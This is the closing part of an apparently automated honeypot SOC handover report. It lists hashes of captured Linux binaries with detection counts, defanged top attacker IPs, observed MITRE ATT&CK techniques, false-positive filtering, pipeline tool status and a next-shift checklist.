| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `120.230.181[.]229` | CN | China Mobile Communications Corporation | **100** ⚠️ | 6 |
| `67.245.199[.]88` | US | Charter Communications Inc | **100** ⚠️ | 0 |
| `5.181.87[.]35` | TR | Pitline Ltd | **100** ⚠️ | 35 |
| `49.88.156[.]34` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `115.190.13[.]99` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `39.115.183[.]206` | KR | SK Broadband Co Ltd | **100** ⚠️ | 41 |
| `186.219.184[.]142` | BR | Tudo Internet | **100** ⚠️ | 27 |
| `14.103.37[.]34` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `45.78.194[.]186` | SG | BYTEPLUS | **100** ⚠️ | 50 |
| `41.242.115[.]83` | GH | DOLPHIN TELECOMMUNICATION LIMITED | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 178 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 74 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 64 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 34 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 33 |

---

## 🔕 False Positive Summary (19 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| AbuseIPDB score 12 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 16 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 200 cases |
| Tool 34  | Credential Extractor        | ✅ 138 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 14 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 19 filtered (9.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 12 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 64 priority case(s) shown individually · 10 recon entry/entries in table (7 group(s) consolidating 114 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-08T08:59:03Z_
